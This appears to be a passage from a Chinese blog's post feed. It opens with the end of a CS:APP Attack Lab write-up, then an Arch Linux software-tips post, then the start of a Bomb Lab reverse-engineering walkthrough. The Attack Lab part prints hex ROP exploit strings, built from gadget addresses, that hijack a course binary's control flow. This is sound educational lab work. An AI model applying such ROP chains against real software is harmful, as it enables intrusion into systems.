<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</span><br><span class="line">ab 19 40 00 00 00 00 00 # popq %rax </span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie （popq的目标）</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">ec 17 40 00 00 00 00 00 # 返回到 touch2</span><br></pre></td></tr></table></figure>
<h4 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h4><p>攻击目标与之前的<code>Level 3</code>相同，需要将<code>rdi</code>指向<code>cookie</code>的字符串表示的首地址。</p>
<p>目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？</p>
<p>查看<code>gadget_farm</code>中提供的<code>gadget</code>后，我们可以发现可以执行的命令中有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movq %rsp,%rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>这样一条，可以保存当前的<code>rsp</code>值，但是我们面临一个问题，这条命令执行时<code>rsp</code>的值为下一个地址，如果下一个地址中存放了目标字符串，那么命令就无法继续执行下去，也无法进入<code>touch3</code>函数了。</p>
<p>除此之外，似乎没有别的<code>gadget</code>可以帮助我们获取<code>rsp</code>的地址了。</p>
<p>我在这个地方卡了好几个小时，最后在别人的提示下才发现<code>gadget_farm</code>中有这样一个<code>gadget</code>画风与其他的不太一样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;: </span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>这明明就是一个可以直接使用的函数！它的作用是将<code>rdi</code>与<code>rsi</code>中的值相加后存放在<code>rax</code>中。</p>
<p>有了这个，我们就可以把<code>rsp</code>的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。</p>
<p>同时还要注意的是，这里有些<code>gadget</code>藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。</p>
<p>仔细找出所有可以执行的指令并整理之后我得出了这样一张图：</p>
<p><img src="/images/attacklab06.png" alt=""></p>
<p>目标字符串存放的位置一定在<code>touch3</code>地址之上（原因见前文）。</p>
<p>由于相加操作只能对<code>rsi</code>与<code>rdi</code>进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条<code>movl</code>组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把<code>rsp</code>的值存放在<code>rdi</code>中，把偏移量的值通过<code>popq</code>指令从栈中取出放在<code>esi</code>中，再利用<code>add_xy</code>函数将它们相加的结果存放到<code>rax</code>再转移到<code>rdi</code>中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。</p>
<p>根据上面这些信息，我们可以把栈结构示意出来：</p>
<p><img src="/images/attacklab07.png" alt=""></p>
<p>标注灰色的地方是我们计算偏移量的部分（从<code>rsp</code>读入时开始），可以计算出偏移量为<code>4 x 8 = 32 = 0x20</code>，再依此计算各命令的地址、构建出我们的攻击字符串：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00</span><br><span class="line">cc 19 40 00 00 00 00 00 # popq %rax</span><br><span class="line">20 00 00 00 00 00 00 00 # 偏移量</span><br><span class="line">42 1a 40 00 00 00 00 00 # movl %eax,%edx</span><br><span class="line">69 1a 40 00 00 00 00 00 # movl %edx,%ecx</span><br><span class="line">27 1a 40 00 00 00 00 00 # movl %ecx,%esi</span><br><span class="line">06 1a 40 00 00 00 00 00 # movq %rsp,%rax</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">d6 19 40 00 00 00 00 00 # add_xy</span><br><span class="line">c5 19 40 00 00 00 00 00 # movq %rax,%rdi</span><br><span class="line">fa 18 40 00 00 00 00 00 # touch3地址</span><br><span class="line">35 39 62 39 39 37 66 61 # 目标字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>
<h3 id="实验小结"><a href="#实验小结" class="headerlink" title="实验小结"></a>实验小结</h3><p><code>Attack Lab</code>与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的<code>gadget</code>而忽略了函数本身的作用。</p>
<p>这次实验加强了我对于函数调用栈，字节序，<code>gdb</code>使用，汇编的理解。</p>
]]></content>
      <categories>
        <category>Computer System</category>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>Computer System</tag>
        <tag>CS:APP</tag>
      </tags>
  </entry>
  <entry>
    <title>ArchLinux你可能需要知道的操作与软件包推荐「持续更新」</title>
    <url>/2017/07/02/arch_more/</url>
    <content><![CDATA[<h2 id="你可能需要知道的操作与软件包推荐"><a href="#你可能需要知道的操作与软件包推荐" class="headerlink" title="你可能需要知道的操作与软件包推荐"></a>你可能需要知道的操作与软件包推荐</h2><p>在<a href="http://www.viseator.com/2017/05/17/arch_install/">第一篇教程</a>中介绍了<code>ArchLinux</code>的基本安装，<a href="http://www.viseator.com/2017/05/19/arch_setup/">第二篇教程</a>中介绍了必须的设置与图形界面的安装，这篇文章并不是教程，只是推荐一些自己日常使用的操作与软件包。写这篇文章时没有重新安装，所以不会有详细的过程，只是简单地列举应该装的软件包或者是基础的配置，更加细节的内容请查阅相关<code>wiki</code>。</p>
<a id="more"></a>
<h3 id="安装yay"><a href="#安装yay" class="headerlink" title="安装yay"></a>安装yay</h3><p>在之前我们管理软件包都是使用官方为我们提供的<code>pacman</code>，软件包的来源都是官方。但是<code>Arch</code>拥有一个强大的用户库<code>AUR</code>即<a href="https://wiki.archlinux.org/index.php/Arch_User_Repository" target="_blank" rel="noopener">Arch User Repository</a>，为我们提供了官方包之外的各种软件包，一些闭源的软件包也可以在上面找到，可以说<code>AUR</code>极大地丰富了软件包的种类与数量，并可以配合<code>yay</code>这样的工具为用户省下大量安装、更新软件包的时间。</p>
<p><code>yay</code>实际上也是一个软件包，我们可以把它看成是对<code>pacman</code>的包装，它兼容<code>pacman</code>的所有操作，最大的不同是我们可以用它方便地安装与管理<code>AUR</code>中的包，下面的许多软件包都是在<code>AUR</code>库中的，也都是使用<code>AUR</code>来安装的。</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aur.archlinux.org/yay.git</span><br><span class="line"><span class="built_in">cd</span> yay</span><br><span class="line">makepkg -si</span><br></pre></td></tr></table></figure>
<p><code>yay</code>就被成功地安装了。</p>
<h4 id="yay使用"><a href="#yay使用" class="headerlink" title="yay使用"></a><code>yay</code>使用</h4><p>请见(虽然讲的是<code>yaourt</code>但是<code>yaourt</code>已经被废弃了，<code>yay</code>的使用方式与<code>yaourt</code>保持一致)：</p>
<blockquote>
<p>  <a href="https://www.linuxdashen.com/arch-linux%E4%BD%BF%E7%94%A8yaourt%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%BD%BB%E6%9D%BE%E5%AE%89%E8%A3%85aur%E8%BD%AF%E4%BB%B6%E5%8C%85" target="_blank" rel="noopener">https://www.linuxdashen.com/arch-linux%E4%BD%BF%E7%94%A8yaourt%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E8%BD%BB%E6%9D%BE%E5%AE%89%E8%A3%85aur%E8%BD%AF%E4%BB%B6%E5%8C%85</a></p>
</blockquote>
<h3 id="滚动更新"><a href="#滚动更新" class="headerlink" title="滚动更新"></a>滚动更新</h3><p><code>ArchLinux</code>的更新机制是非常激进的滚动更新，也就是说<code>ArchLinux</code>的软件与内核会时刻与稳定版本保持一致，你所用的系统总是时刻保持最新的。</p>
<p>这个机制给很多<code>Arch</code>教徒带来了强大的快感，可以第一时间体验到新的软件与新 的内核，但是也存在着日常滚炸这样的问题。虽然滚动更新的包可能因为没有经过完善的测试会导致系统不能工作种种问题，但是绝大部分情况下的更新都不会导致太大的问题。修复滚炸的系统和提交Bug信息也是<code>ArchLinux</code>用户的技能之一。</p>
<p>滚动更新命令使用<code>yay</code>非常简单：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay -Syu</span><br></pre></td></tr></table></figure>
<h3 id="shadowsocks"><a href="#shadowsocks" class="headerlink" title="shadowsocks"></a>shadowsocks</h3><h4 id="图形版本"><a href="#图形版本" class="headerlink" title="图形版本"></a>图形版本</h4><p><strong>2017.10.11 更新：目前的<code>qt5</code>客户端可能有失效的问题，请使用<code>shadowsocks</code>包提供的命令行版本</strong></p>
<p>安装官方源中的<code>shadowsocks-qt5</code>包，自带图形界面，通过软件菜单（桌面环境自带）启动即可。</p>
<h4 id="命令行版本"><a href="#命令行版本" class="headerlink" title="命令行版本"></a>命令行版本</h4><p>安装官方源中的<code>shadowsocks</code>包，编辑<code>/etc/example.json</code>文件，按示例填写：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"server"</span>:<span class="string">"my_server_ip"</span>,</span><br><span class="line">    <span class="attr">"server_port"</span>:<span class="number">8388</span>,</span><br><span class="line">    <span class="attr">"local_address"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"local_port"</span>:<span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"password"</span>:<span class="string">"mypassword"</span>,</span><br><span class="line">    <span class="attr">"timeout"</span>:<span class="number">300</span>,</span><br><span class="line">    <span class="attr">"method"</span>:<span class="string">"aes-256-cfb"</span>,</span><br><span class="line">    <span class="attr">"fast_open"</span>: <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>server</code>：服务器地址</p>
<p><code>server_port</code>：服务器端口</p>
<p>下面两行分别是本地地址和本地端口</p>
<p><code>password</code>：密码</p>
<p><code>method</code>：加密方式</p>
<p>然后以系统服务方式启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl start shadowsocks@example.service</span><br></pre></td></tr></table></figure>
<p>如需开机启动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> shadowsocks@example.service</span><br></pre></td></tr></table></figure>
<h3 id="Chrome代理"><a href="#Chrome代理" class="headerlink" title="Chrome代理"></a>Chrome代理</h3><p><strong>需先配置好本地<code>shadowsocks</code>代理</strong></p>
<p>安装官方源中开源的<code>chromium</code>或者<code>AUR</code>中的<code>google-chrome</code>都可以，下面以<code>google-chrome</code>为例。</p>
<p>先用命令行代理启动<code>chrome</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">google-chrome-stable --proxy-server=<span class="string">"socks5://127.0.0.1:1080"</span></span><br></pre></td></tr></table></figure>
<p><code>chromium</code>换下命令就可以。</p>
<p>然后安装<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=en" target="_blank" rel="noopener">SwitchyOmega</a>这个插件，配置好<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener"><code>GFWList</code></a>和代理规则就可以自动代理了。之后的启动就不需要命令行了。</p>
<h3 id="命令行代理"><a href="#命令行代理" class="headerlink" title="命令行代理"></a>命令行代理</h3><p><strong>需先配置好本地<code>shadowsocks</code>代理</strong></p>
<p>推荐使用<code>proxychains-ng</code>包进行命令行代理：</p>
<p>安装<code>proxychains-ng</code>包后编辑<code>/etc/proxychains.conf</code>文件（需<code>root</code>权限）</p>
<p>到文件末尾找到<code>ProxyList</code>项，按示例添加本地代理：</p>
<p><img src="/images/arch24.png" alt=""></p>
<p>图为我的<code>socks5</code>配置，保存后退出。</p>
<p>之后需要用代理运行的命令都可以通过在命令前加上<code>proxychains</code>来使用代理运行。</p>
<h3 id="中文字体与中文输入法"><a href="#中文字体与中文输入法" class="headerlink" title="中文字体与中文输入法"></a>中文字体与中文输入法</h3><p>中文字体推荐安装官方源中<code>noto-fonts-cjk</code>，中文输入法需要安装<code>fcitx</code>包与<code>fcitx-im</code>集合包，再加上一个中文支持包，可以到<a href="https://wiki.archlinux.org/index.php/fcitx#Chinese" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/fcitx#Chinese</a>中挑选一个喜欢的包装上。</p>
<p>装完以后需要修改<code>/etc/profile</code>文件，在文件开头加入三行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> XMODIFIERS=<span class="string">"@im=fcitx"</span></span><br><span class="line"><span class="built_in">export</span> GTK_IM_MODULE=<span class="string">"fcitx"</span></span><br><span class="line"><span class="built_in">export</span> QT_IM_MODULE=<span class="string">"fcitx"</span></span><br></pre></td></tr></table></figure>
<p>可以解决一些软件无法调出<code>fcitx</code>的问题。</p>
<h3 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h3><p><code>zsh</code>是默认<code>shell</code> <code>bash</code>的替代品之一，它的特点是插件多配置方便，兼容<code>bash</code>脚本并且支持更强大的高亮与补全。</p>
<p>安装官方源中<code>zsh</code>包。</p>
<p>设置<code>zsh</code>为默认<code>shell</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo chsh -s /bin/zsh username</span><br></pre></td></tr></table></figure>
<p>推荐安装<code>AUR</code>中的<code>oh-my-zsh-git</code>这个包，可以帮助配置一些实用的功能。</p>
<p>其他主题插件配置请见<a href="https://github.com/robbyrussell/oh-my-zsh" target="_blank" rel="noopener">oh-my-zsh</a>的配置介绍，分享一下我安装的插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">plugins=(vim git sudo extract z wd archlinux zsh-autosuggestions zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure>
<p>注意后面两个插件需要安装相应的支持包并配置才能使用。</p>
<h3 id="Synapse"><a href="#Synapse" class="headerlink" title="Synapse"></a>Synapse</h3><p><code>Synapse</code>是一个快速的软件启动器，可以方便地查找安装的软件，设置快捷键使用再也不用找软件入口了。</p>
<p>安装官方源中的<code>synapse</code>包。</p>
<h3 id="Yakuake"><a href="#Yakuake" class="headerlink" title="Yakuake"></a>Yakuake</h3><p><code>Yakuake</code>是一个终端模拟器，我使用它的原因是它支持下拉，配合快捷键使用非常方便：</p>
<p><img src="/images/arch23.png" alt=""></p>
<p>安装官方源中的<code>yakuake</code>包。</p>
<h3 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h3><p>有些时候需要使用<code>windows</code>而不想切换系统或干脆没有<code>windows</code>的情况下，我们可以使用<code>windows</code>虚拟机来代替。当然虚拟机的用处不止于此。</p>
<p><code>Arch</code>下的虚拟机首先开源的<code>VirtualBox</code>，安装官方源的<code>virtualbox</code> <code>virtualbox-ext-vnc</code> <code>virtualbox-guest-iso</code> <code>virtualbox-host-modules-arch</code>这几个包。</p>
<p>再去<a href="https://www.virtualbox.org/wiki/Downloads" target="_blank" rel="noopener">官网</a>下载<strong>Oracle VM VirtualBox Extension Pack</strong> ，在设置中导入使用。安装<code>windows</code>的过程不在这里讲解，记得安装之后在<code>windows</code>内安装扩展客户端软件即可。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力：</p>
<blockquote>
<p>  Arch Linux 怎么安装？ - viseator的回答 - 知乎<br>  <a href="https://www.zhihu.com/question/21427410/answer/171867330" target="_blank" rel="noopener">https://www.zhihu.com/question/21427410/answer/171867330</a></p>
</blockquote>
<p><strong>同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：</strong>：</p>
<p><a href="https://www.viseator.com/2020/05/24/university_1/">从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活</a></p>
<p>也欢迎关注我的微信公众号VirMe：<br><img src="/images/wechat_channel.jpg" alt=""></p>
<p>如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件<a href="mailto:viseator@gmail.com">viseator@gmail.com</a>（尽量附上错误信息），我会尽力回复解决。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统（CS:APP) - Bomb Lab详解</title>
    <url>/2017/06/21/CS_APP_BombLab/</url>
    <content><![CDATA[<h2 id="Bomb-Lab"><a href="#Bomb-Lab" class="headerlink" title="Bomb Lab"></a>Bomb Lab</h2><p>实验代码见<a href="https://github.com/viseator/CS-APP-3e-labs" target="_blank" rel="noopener">GitHub</a></p>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>BombLab是CS:APP中对应第三章内容：程序的机器级表示的lab。主要内容为提供一个二进制对象文件<code>bomb</code>，当运行时，它会要求用户输入六个字符串，如果其中的任何一个不正确，炸弹就会爆炸，输出一行错误信息并向计分服务器提交（自学所用的材料不会向服务器提交信息，但这不代表我们可以随意让炸弹爆炸），学生必须通过反汇编和逆向工程来找到六个正确的字符串来解除自己的炸弹（理论上每个人的炸弹答案都不同，但自学材料的答案都是一样的，本文针对的是自学材料）。</p>
<a id="more"></a>
<h3 id="所用工具"><a href="#所用工具" class="headerlink" title="所用工具"></a>所用工具</h3><p><code>objdump</code>-用于反汇编二进制对象文件</p>
<p><code>VS Code</code>-用于查看反汇编后的结果与文本文件的编写</p>
<p><code>gdb</code>-用于运行时单步调试与查看运行时内存与寄存器信息</p>
<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h4 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h4><p>由于之前没有接触过类似的逆向工程问题，拿到问题以后第一时间很难马上开始解决。所以先查看我们能看到的文件信息。</p>
<p>目录中提供了一个<code>bomb.c</code>文件，文件内容十分简单，有一份非常有趣的<code>LISENCE</code>:</p>
<blockquote>
<p>/<strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>***</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>* Dr. Evil’s Insidious Bomb, Version 1.1</p>
<p>* Copyright 2011, Dr. Evil Incorporated. All rights reserved.</p>
<p>*</p>
<p>* LICENSE:</p>
<p>*</p>
<p>* Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</p>
<p>* VICTIM) explicit permission to use this bomb (the BOMB).  This is a</p>
<p>* time limited license, which expires on the death of the VICTIM.</p>
<p>* The PERPETRATOR takes no responsibility for damage, frustration,</p>
<p>* insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</p>
<p>* harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</p>
<p>* that is.  The VICTIM may not distribute this bomb source code to</p>
<p>* any enemies of the PERPETRATOR.  No VICTIM may debug,</p>
<p>* reverse-engineer, run “strings” on, decompile, decrypt, or use any</p>
<p>* other technique to gain knowledge of and defuse the BOMB.  BOMB</p>
<p>* proof clothing may not be worn when handling this program.  The</p>
<p>* PERPETRATOR will not apologize for the PERPETRATOR’s poor sense of</p>
<p>* humor.  This license is null and void where the BOMB is prohibited</p>
<p>* by law.</p>
<p><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>***</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>/</p>
</blockquote>
<p>接下来的部分就是<code>main</code>函数，从主函数中我们可以看到整个程序的结构与输入方式：可以从标准输入或文件中读取，一行作为一题的解，解出一个问题以后可以进入下一个问题，注意到返回前的一段注释：</p>
<blockquote>
<p>  ​    /* Wow, they got it!  But isn’t something… missing?  Perhaps</p>
<p>  ​     * something they overlooked?  Mua ha ha ha ha! */</p>
</blockquote>
<p>暗示了我们隐藏问题的存在，除此之外再也没有任何关于这个炸弹的信息。</p>
<p>下面我们使用<code>objdump</code>命令将炸弹文件反汇编出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.asm</span><br></pre></td></tr></table></figure>
<p>然后通过<code>VS Code</code>来查看反汇编的结果，<code>VS Code</code>有<a href="https://marketplace.visualstudio.com/items?itemName=13xforever.language-x86-64-assembly" target="_blank" rel="noopener">x86 and x86_64 Assembly</a>这个插件可以高亮汇编，看起来会舒服许多。</p>
<p>反汇编出来的代码有近六千行，但是因为有符号表的存在，说明保留了调试所需的信息，我们可以通过<code>gdb</code>进行单步调试来查看程序的运行过程。</p>
<p>在使用<code>gdb</code> 的时候，我们可以加上<code>-tui</code>命令并用<code>layout asm</code>命令切换到汇编指令模式，就可以在调试的时候查看对应的汇编代码了。界面如下：</p>
<p><img src="/images/bomblab1.jpg" alt=""></p>
<p>可以看到地址<code>0x400da0</code>就是<code>main</code>函数的地址。</p>
<p>一直向下查看，我们就可以看到C文件中出现的<code>initialize_bomb</code>函数，然后就到了<code>phase_1</code>函数，我们可以推测这个函数就是判断是否通过的核心函数。</p>
<p>这时候就要用到<code>gdb</code>的指令了，在汇编模式下的指令与普通模式有一些不同。我们可以使用<code>ni</code>(<code>next instruction</code>)和<code>si</code>(<code>step into</code>)来实现普通模式下的单步向下执行与步入操作。</p>
<p>打断点需要使用<code>b &lt;func_name&gt;</code>或<code>b *&lt;address&gt;</code>来进行比如我们可以看到调用<code>phase_1</code>函数的<code>call</code>指令的地址是<code>0x400e3a</code>，所以我们可以使用<code>b phase_1</code>或<code>b *0x400e3a</code>来打断点的，这两条命令有一点不同就在于断在地址会停在地址 上也就是<code>call</code>指令的位置，断在函数名会进入函数中，相当于再进行了一次<code>si</code>操作。</p>
<p>断点停后有可能出现字符重叠的情况，我们可以使用<code>refresh</code>命令刷新界面。</p>
<p>下面把断点打在<code>phase_1</code>函数之后就可以使用<code>r</code>命令来运行指令了，程序会提示我们输入字符串，这个时候因为我们打了断点不用担心炸弹会爆炸，可以随意输入。执行后程序会停在<code>phase_1</code>函数的位置，我们可以看到函数内部的情况。</p>
<p>下面就可以根据函数内部的逻辑来解决炸弹了。</p>
<p>代码来自<code>objdump -d</code>反汇编出来的代码，与<code>gdb</code>的汇编模式下看到的代码是一样的。</p>
<h4 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h4><p>主函数代码比较长，只贴我们需要分析的关键部分。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi</span><br></pre></td></tr></table></figure>
<p>第一句调用了<code>read_line</code>函数，我们可以转到函数入口地址<code>40149e</code>去查看<code>read_line</code>的代码（事实上一开始我也这么做了），但是会发现代码中包含了许多对系统库函数的调用，仔细分析的难度比较大并且没有必要。从提供的C代码与函数名称，我们可以推测出这个函数的作用是读取一行输入。根据返回值一般存放在<code>rax</code>中的约定，<code>rax</code>中应该就是读入的数据的地址，第二句中我们把这个值复制到了<code>rdi</code>中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure>
<p>接下来两句分别开始调用<code>phase_1</code>与<code>phase_defused</code>，下面的五个阶段也是上面这样的模式。</p>
<h4 id="阶段一"><a href="#阶段一" class="headerlink" title="阶段一"></a>阶段一</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>阶段一的代码比较短，第二行中把一个地址给了<code>esi</code>，接下来调用了<code>strings_not_equal</code>这个函数，我们可以跳到函数入口地址查看这个函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">40133c:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">40133f:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br></pre></td></tr></table></figure>
<p>函数中这两行分别把<code>rdi</code> <code>rsi</code>的值复制到了<code>rbx</code>与<code>rbp</code>，然后调用了<code>string_length</code>，这个时候就不用去看<code>string_length</code>函数了，我们可以直接猜测出<code>rbx</code>与<code>rbp</code>就是函数的参数。那么可以说明<code>rdi</code> <code>rsi</code>就是给<code>string_not_equal</code>的函数，那么<code>string_not_equal</code>的返回值是什么呢？</p>
<p>看到<code>string_not_equal</code>返回后的5、6两句，测试了<code>eax</code>的值，在<code>eax</code>等于0时就跳转到<code>400ef7</code>，如果不为0，那么会继续向下执行，下面一句是调用<code>explode_bomb</code>函数，不用说这一定是触发炸弹的函数，所以我们需要令<code>string_not_equal</code>的返回值为0，那么从名字判断，我们需要令两个字符串相等，两个字符串之前说过存放在<code>rdi</code>与<code>rsi</code>中，<code>rdi</code>是我们读入的字符串，而<code>rsi</code>中存放的是<code>400ee4</code>复制的<code>0x402400</code>，这个时候用<code>gdb</code>去查看该地址中存放的字符串比较方便：</p>
<p><img src="/images/bomblab2.png" alt=""></p>
<p>这串字符就是第一阶段的答案。</p>
<h4 id="阶段二"><a href="#阶段二" class="headerlink" title="阶段二"></a>阶段二</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400efc:	55                   	push   %rbp</span><br><span class="line">400efd:	53                   	push   %rbx</span><br><span class="line">400efe:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">400f02:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">400f05:	e8 52 05 00 00       	callq  40145c &lt;read_six_numbers&gt;</span><br><span class="line">400f0a:	83 3c 24 01          	cmpl   $0x1,(%rsp)</span><br><span class="line">400f0e:	74 20                	je     400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f10:	e8 25 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f15:	eb 19                	jmp    400f30 &lt;phase_2+0x34&gt;</span><br><span class="line">400f17:	8b 43 fc             	mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:	01 c0                	add    %eax,%eax</span><br><span class="line">400f1c:	39 03                	cmp    %eax,(%rbx)</span><br><span class="line">400f1e:	74 05                	je     400f25 &lt;phase_2+0x29&gt;</span><br><span class="line">400f20:	e8 15 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">400f25:	48 83 c3 04          	add    $0x4,%rbx</span><br><span class="line">400f29:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">400f2c:	75 e9                	jne    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f2e:	eb 0c                	jmp    400f3c &lt;phase_2+0x40&gt;</span><br><span class="line">400f30:	48 8d 5c 24 04       	lea    0x4(%rsp),%rbx</span><br><span class="line">400f35:	48 8d 6c 24 18       	lea    0x18(%rsp),%rbp</span><br><span class="line">400f3a:	eb db                	jmp    400f17 &lt;phase_2+0x1b&gt;</span><br><span class="line">400f3c:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">400f40:	5b                   	pop    %rbx</span><br><span class="line">400f41:	5d                   	pop    %rbp</span><br><span class="line">400f42:	c3                   	retq</span><br></pre></td></tr></table></figure>
<p>进入<code>phase_2</code>函数，观察它的代码，可以发现第5行调用了一个名为<code>read_six_numbers</code>这个函数，顾名思义，这个函数的作用应该是从输入中读取6个数字，那么问题来了，这6个数字是怎么返回的呢？我们注意到第4行中把<code>rsp</code>的值复制给了<code>rsi</code>，我们可以猜测这个函数是使用栈来返回读入的结果。</p>
<p>当然只是猜测是不行的，我们需要用实验去验证我们的想法，我们在输入文件中设置<code>1 2 3 4 5 6</code>这一行输入，然后将断点打在<code>*400f0a</code>这个函数刚返回的位置（注意输入中应该含有第一阶段的答案，不然炸弹就炸在第一阶段了）。运行停在断点之后查看栈中的内容：</p>
<p><img src="/images/bomblab3.png" alt=""></p>
<p>我们打出了<code>rsp</code>开始32字节的内容，发现栈中依次存放了输入的6个数，之后就是返回的地址。那么我们可以确定读取的数值就是依次存放在栈中的。</p>
